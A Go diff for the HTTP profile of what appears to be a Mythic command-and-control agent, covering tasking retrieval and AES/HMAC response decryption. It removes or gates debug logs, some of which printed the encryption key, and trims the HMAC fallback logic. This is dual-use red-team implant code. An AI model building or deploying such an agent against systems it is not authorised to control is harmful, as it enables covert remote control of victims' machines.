@@ -169,7 +169,6 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 // GetTasking retrieves tasks from Mythic
 func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
-	log.Printf("[DEBUG] GetTasking called for agent %s", agent.PayloadUUID[:8])
 	if h.Debug {
 		log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.Endpoint)
 	}
@@ -226,23 +225,24 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	// Decrypt the response if encryption key is provided
 	var decryptedData []byte
 	if h.EncryptionKey != "" {
-		log.Printf("[DEBUG] Decrypting response...")
+		if h.Debug {
+			log.Printf("[DEBUG] Decrypting response...")
+		}
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
-			log.Printf("[DEBUG] Failed to base64 decode response: %v", err)
 			return nil, fmt.Errorf("failed to decode response: %w", err)
 		}
 		
 		// Decrypt the decoded data
 		decryptedData, err = h.decryptResponse(decodedData)
 		if err != nil {
-			log.Printf("[DEBUG] Failed to decrypt response: %v", err)
 			return nil, fmt.Errorf("failed to decrypt response: %w", err)
 		}
-		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedData))
+		if h.Debug {
+			log.Printf("[DEBUG] Decryption successful")
+		}
 	} else {
-		log.Printf("[DEBUG] No encryption key, using raw response")
 		decryptedData = respBody
 	}
 
@@ -287,16 +287,11 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 		return encryptedData, nil // No encryption
 	}
 
-	log.Printf("[DEBUG] Decryption key (base64): %s", h.EncryptionKey)
-
 	// Decode the base64 key
 	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
-
-	log.Printf("[DEBUG] Decoded key length: %d bytes", len(key))
-	log.Printf("[DEBUG] Decoded key (hex): %x", key)
 
 	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
 	if len(encryptedData) < 36+16+32 {
@@ -305,7 +300,9 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 
 	// Extract UUID (first 36 bytes)
 	uuidBytes := encryptedData[:36]
-	log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
+	if h.Debug {
+		log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
+	}
 
 	// Extract IV (next 16 bytes)
 	iv := encryptedData[36:52]
@@ -317,7 +314,6 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	ciphertext := encryptedData[52 : len(encryptedData)-32]
 
 	log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
-	log.Printf("[DEBUG] Expected total: %d (36+16+%d+32)", 36+16+len(ciphertext)+32, len(ciphertext))
 
 	// Verify HMAC
 	mac := hmac.New(sha256.New, key)
@@ -325,35 +321,25 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	mac.Write(dataForHmac)
 	expectedHmac := mac.Sum(nil)
 
-	log.Printf("[DEBUG] HMAC verification:")
-	log.Printf("[DEBUG]   Key length: %d", len(key))
-	log.Printf("[DEBUG]   Data for HMAC length: %d", len(dataForHmac))
-	log.Printf("[DEBUG]   Received HMAC: %x", hmacBytes)
-	log.Printf("[DEBUG]   Expected HMAC: %x", expectedHmac)
-	log.Printf("[DEBUG]   HMAC match: %v", hmac.Equal(hmacBytes, expectedHmac))
+	if h.Debug {
+		log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
+	}
 
 	if !hmac.Equal(hmacBytes, expectedHmac) {
-		log.Printf("[DEBUG] Primary HMAC verification failed, trying alternative methods...")
+		if h.Debug {
+			log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
+		}
 		
-		// Try HMAC on just the ciphertext (alternative method)
-		mac2 := hmac.New(sha256.New, key)
-		mac2.Write(ciphertext)
-		expectedHmac2 := mac2.Sum(nil)
-		log.Printf("[DEBUG] Alternative HMAC (ciphertext only): %x", expectedHmac2)
+		// Try HMAC on IV + ciphertext (alternative method for Mythic)
+		mac3 := hmac.New(sha256.New, key)
+		mac3.Write(encryptedData[36:len(encryptedData)-32]) // IV + ciphertext
+		expectedHmac3 := mac3.Sum(nil)
 		
-		if hmac.Equal(hmacBytes, expectedHmac2) {
-			log.Printf("[DEBUG] Alternative HMAC method succeeded!")
-		} else {
-			// Try HMAC on UUID + IV + ciphertext (without UUID in the calculation)
-			mac3 := hmac.New(sha256.New, key)
-			mac3.Write(encryptedData[36:len(encryptedData)-32]) // IV + ciphertext
-			expectedHmac3 := mac3.Sum(nil)
-			log.Printf("[DEBUG] Alternative HMAC (IV+ciphertext): %x", expectedHmac3)
-			
-			if !hmac.Equal(hmacBytes, expectedHmac3) {
-				return nil, fmt.Errorf("HMAC verification failed with all methods")
-			}
-			log.Printf("[DEBUG] Alternative HMAC method 2 succeeded!")
+		if !hmac.Equal(hmacBytes, expectedHmac3) {
+			return nil, fmt.Errorf("HMAC verification failed with all methods")
+		}
+		if h.Debug {
+			log.Printf("[DEBUG] Alternative HMAC method succeeded")
 		}
 	}
 
@@ -442,7 +428,9 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 // makeRequest is a helper function to make HTTP requests
 func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
 	url := h.BaseURL + path
-	log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
+	if h.Debug {
+		log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
+	}
 
 	var reqBody io.Reader
 	if body != nil {
@@ -461,17 +449,14 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 
 	if h.Debug {
 		log.Printf("[DEBUG] Making %s request to %s", method, url)
-		log.Printf("[DEBUG] Request body: %s", string(body))
 	}
 
-	log.Printf("[DEBUG] Executing HTTP client.Do()")
 	resp, err := h.client.Do(req)
 	if err != nil {
-		log.Printf("[DEBUG] HTTP client.Do() failed: %v", err)
+		log.Printf("[DEBUG] HTTP request failed: %v", err)
 		return nil, fmt.Errorf("HTTP request failed: %w", err)
 	}
 	
-	log.Printf("[DEBUG] HTTP client.Do() completed successfully, status: %d", resp.StatusCode)
 	return resp, nil
 }
 
